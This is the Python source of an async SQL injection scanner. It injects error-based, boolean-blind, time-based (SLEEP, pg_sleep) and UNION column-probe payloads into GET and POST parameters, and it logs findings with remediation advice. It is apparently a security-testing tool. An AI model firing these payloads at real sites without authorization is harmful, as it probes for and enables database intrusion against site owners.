"""
SQL Injection scanner.
Covers: error-based, union-based, boolean-blind, time-based, and basic second-order probes.
Heuristics:
  - Error fingerprinting (DB-specific)
  - Content-diff against baseline
  - Status code anomalies
  - Timing deltas for time-based injections
"""

from __future__ import annotations
import asyncio
import json
import re
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse

import aiohttp

from backend.core.evidence import EvidenceLogger
from diffing.responses import ResponseDiffer
from evasions.encode import url_safe
from backend.core.context import ScanContext


DB_ERRORS = [
    # MySQL
    r"SQL syntax.*MySQL",
    r"Warning: mysqli?::",
    r"MySQL server version for the right syntax",
    r"Unknown column '.*' in 'field list'",
    # PostgreSQL
    r"PG::SyntaxError",
    r"psql: error",
    r"ERROR:\s+syntax error at or near",
    r"invalid input syntax for type",
    # MSSQL
    r"Unclosed quotation mark after the character string",
    r"SQL Server.*Driver",
    r"Microsoft OLE DB Provider for SQL Server",
    # Oracle
    r"ORA-\d{5}",
    r"Oracle error",
    # SQLite
    r"SQLite\/JDBCDriver",
    r"SQLITE_ERROR",
    r"near \"SELECT\": syntax error",
]

DB_ERROR_RE = re.compile("|".join(DB_ERRORS), re.IGNORECASE | re.MULTILINE)

TIME_SAFETY_TIMEOUT = 15  # seconds per request cap


def _with_param(url: str, key: str, value: str) -> str:
    """
    Replace/add a single query parameter in `url` with `value`.
    """
    parsed = urlparse(url)
    q = dict(parse_qsl(parsed.query, keep_blank_values=True))
    q[key] = value
    new_q = urlencode(q, doseq=True)
    return urlunparse(parsed._replace(query=new_q))


class SQLiScanner:
    """
    Async SQL Injection scanner.
    """

    def __init__(
        self,
        base_url: str,
        session: aiohttp.ClientSession,
        logger: EvidenceLogger,
        ctx: Optional[ScanContext] = None,
        max_union_cols: int = 6,
    ):
        self.base_url = base_url.rstrip("/")
        self.session = session
        self.logger = logger
        self.ctx = ctx
        self.max_union_cols = max_union_cols
        self.differ = ResponseDiffer()

        # Baseline markers (param -> baseline text/len/code)
        self._baselines: Dict[str, Tuple[int, int, str]] = {}

        # Boolean-blind payload pairs (true_variant, false_variant)
        self.boolean_pairs: List[Tuple[str, str]] = [
            ("1' OR '1'='1", "1' AND '1'='2"),
            ("1) OR (1=1", "1) AND (1=2"),
            ("1') OR ('1'='1", "1') AND ('1'='2"),
        ]

        # Error-based simple ticks
        self.error_payloads: List[str] = [
            "'", "\"", "'))", "'))--", "`", "1'--", "1')--", "1\"--", "1) --",
        ]

        # Time-based payloads (MySQL, PostgreSQL)
        self.time_payloads: List[str] = [
            "1' OR SLEEP(5)-- ",
            "1'); SELECT pg_sleep(5); --",
            "1) OR SLEEP(5)-- ",
            "1) ; SELECT pg_sleep(5); --",
        ]

    async def _fetch(self, url: str, method: str = "GET", data: Optional[dict] = None) -> Tuple[int, str, Dict[str, str]]:
        try:
            timeout = aiohttp.ClientTimeout(total=TIME_SAFETY_TIMEOUT)
            if method.upper() == "GET":
                async with self.session.get(url, timeout=timeout) as r:
                    return r.status, await r.text(errors="ignore"), dict(r.headers)
            else:
                async with self.session.post(url, data=data, timeout=timeout) as r:
                    return r.status, await r.text(errors="ignore"), dict(r.headers)
        except Exception as e:
            self.logger.log_error("SQLiScanner._fetch", f"{url}: {e}")
            return 0, "", {}

    async def _baseline(self, url: str, param: str) -> Tuple[int, int, str]:
        if param in self._baselines:
            return self._baselines[param]
        status, body, _ = await self._fetch(url)
        baseline = (status, len(body), body[:4000])
        self._baselines[param] = baseline
        return baseline

    def _looks_like_db_error(self, body: str) -> Optional[str]:
        m = DB_ERROR_RE.search(body or "")
        return m.group(0) if m else None

    async def scan_get_params(self, url: str, params: List[str]) -> List[dict]:
        findings: List[dict] = []
        for p in params:
            baseline_status, baseline_len, baseline_snippet = await self._baseline(url, p)

            # 1) Error-based quick checks
            for inj in self.error_payloads:
                test_url = _with_param(url, p, url_safe(inj))
                status, body, _ = await self._fetch(test_url)
                if status == 0:
                    continue
                err = self._looks_like_db_error(body)
                if err:
                    f = self._report(
                        title="SQL Injection (Error-based)",
                        url=test_url,
                        param=p,
                        technique="error-based",
                        evidence=err,
                        baseline_status=baseline_status,
                        status=status,
                        baseline_len=baseline_len,
                        new_len=len(body),
                    )
                    findings.append(f)
                    break  # one is enough to flag error-based

            # 2) Boolean-based blind
            for t, f_val in self.boolean_pairs:
                t_url = _with_param(url, p, url_safe(t))
                f_url = _with_param(url, p, url_safe(f_val))
                st_t, body_t, _ = await self._fetch(t_url)
                st_f, body_f, _ = await self._fetch(f_url)
                if st_t == 0 or st_f == 0:
                    continue

                # Compare similarity ratios; large diff suggests conditional change
                sim_tf = self.differ.similarity(body_t, body_f)
                sim_tb = self.differ.similarity(body_t, baseline_snippet)
                sim_fb = self.differ.similarity(body_f, baseline_snippet)

                # Heuristic: true differs from false a lot, and one side resembles baseline more than the other
                if sim_tf < 0.60 and (sim_tb > 0.85 or sim_fb > 0.85):
                    f = self._report(
                        title="SQL Injection (Boolean-based)",
                        url=f"{t_url}  vs  {f_url}",
                        param=p,
                        technique="boolean-blind",
                        evidence=f"similarity(true,false)={sim_tf:.2f}, sim(true,base)={sim_tb:.2f}, sim(false,base)={sim_fb:.2f}",
                        baseline_status=baseline_status,
                        status=(st_t, st_f),
                        baseline_len=baseline_len,
                        new_len=(len(body_t), len(body_f)),
                    )
                    findings.append(f)
                    break

            # 3) Time-based blind
            for inj in self.time_payloads:
                test_url = _with_param(url, p, url_safe(inj))
                t0 = time.perf_counter()
                status, body, _ = await self._fetch(test_url)
                dt = time.perf_counter() - t0
                if status == 0:
                    continue

                if dt >= 4.5:  # ~5s sleep indicates execution
                    f = self._report(
                        title="SQL Injection (Time-based)",
                        url=test_url,
                        param=p,
                        technique="time-blind",
                        evidence=f"response time {dt:.2f}s",
                        baseline_status=baseline_status,
                        status=status,
                        baseline_len=baseline_len,
                        new_len=len(body),
                        timing=dt,
                    )
                    findings.append(f)
                    break

            # 4) Union-based quick probe (column discovery heuristic)
            for cols in range(1, self.max_union_cols + 1):
                nulls = ",".join(["NULL"] * cols)
                payload = f"1 UNION SELECT {nulls}-- "
                test_url = _with_param(url, p, url_safe(payload))
                status, body, _ = await self._fetch(test_url)
                if status == 0:
                    continue

                # Look for shift vs baseline
                sim = self.differ.similarity(body, baseline_snippet)
                if sim < 0.70:
                    f = self._report(
                        title="SQL Injection (UNION-based, columns guess)",
                        url=test_url,
                        param=p,
                        technique=f"union-based (cols~{cols})",
                        evidence=f"similarity(baseline,new)={sim:.2f}",
                        baseline_status=baseline_status,
                        status=status,
                        baseline_len=baseline_len,
                        new_len=len(body),
                    )
                    findings.append(f)
                    break

        return findings

    async def scan_post_form(self, url: str, form: Dict[str, str], target_params: Optional[List[str]] = None) -> List[dict]:
        """
        POST form scanning. Only mutates fields listed in target_params (or all if None).
        """
        findings: List[dict] = []
        target_params = target_params or list(form.keys())

        # Baseline
        status_b, body_b, _ = await self._fetch(url, method="POST", data=form)
        baseline = (status_b, len(body_b), body_b[:4000])

        for p in target_params:
            # Error-based
            for inj in self.error_payloads:
                m = {**form, p: inj}
                st, body, _ = await self._fetch(url, method="POST", data=m)
                if st == 0:
                    continue
                err = self._looks_like_db_error(body)
                if err:
                    findings.append(self._report(
                        title="SQL Injection (Error-based, POST)",
                        url=url,
                        param=p,
                        technique="error-based",
                        evidence=err,
                        baseline_status=baseline[0],
                        status=st,
                        baseline_len=baseline[1],
                        new_len=len(body),
                        request_body=json.dumps({**form, p: "<payload>"})[:500],
                    ))
                    break

            # Boolean-based
            for t, f_val in self.boolean_pairs:
                st_t, body_t, _ = await self._fetch(url, method="POST", data={**form, p: t})
                st_f, body_f, _ = await self._fetch(url, method="POST", data={**form, p: f_val})
                if st_t == 0 or st_f == 0:
                    continue
                sim_tf = self.differ.similarity(body_t, body_f)
                sim_tb = self.differ.similarity(body_t, baseline[2])
                sim_fb = self.differ.similarity(body_f, baseline[2])
                if sim_tf < 0.60 and (sim_tb > 0.85 or sim_fb > 0.85):
                    findings.append(self._report(
                        title="SQL Injection (Boolean-based, POST)",
                        url=url,
                        param=p,
                        technique="boolean-blind",
                        evidence=f"similarity(true,false)={sim_tf:.2f}",
                        baseline_status=baseline[0],
                        status=(st_t, st_f),
                        baseline_len=baseline[1],
                        new_len=(len(body_t), len(body_f)),
                        request_body=json.dumps({**form, p: "<true|false>"} )[:500],
                    ))
                    break

            # Time-based
            for inj in self.time_payloads:
                t0 = time.perf_counter()
                st, body, _ = await self._fetch(url, method="POST", data={**form, p: inj})
                dt = time.perf_counter() - t0
                if st == 0:
                    continue
                if dt >= 4.5:
                    findings.append(self._report(
                        title="SQL Injection (Time-based, POST)",
                        url=url,
                        param=p,
                        technique="time-blind",
                        evidence=f"response time {dt:.2f}s",
                        baseline_status=baseline[0],
                        status=st,
                        baseline_len=baseline[1],
                        new_len=len(body),
                        request_body=json.dumps({**form, p: "<time-payload>"} )[:500],
                        timing=dt,
                    ))
                    break

        return findings

    def _report(
        self,
        title: str,
        url: str,
        param: str,
        technique: str,
        evidence: str,
        baseline_status,
        status,
        baseline_len,
        new_len,
        request_body: Optional[str] = None,
        timing: Optional[float] = None,
    ) -> dict:
        data = {
            "title": title,
            "category": "Injection/SQLi",
            "url": url,
            "parameter": param,
            "technique": technique,
            "evidence": evidence,
            "baseline_status": baseline_status,
            "status": status,
            "baseline_len": baseline_len,
            "observed_len": new_len,
            "timing": timing,
            "severity": "High" if technique in ("time-blind", "union-based", "error-based") else "Medium",
            "recommendation": (
                "Use parameterized queries/ORM bind parameters; avoid dynamic SQL. "
                "Apply least-privilege DB accounts and input validation. "
                "Enable ORM/driver escaping consistently."
            ),
        }
        # Persist via EvidenceLogger as a finding
        self.logger.log_finding(
            category="SQL Injection",
            url=url,
            evidence=f"{technique}: {evidence}",
            severity=data["severity"],
            meta=data,
        )
        return data
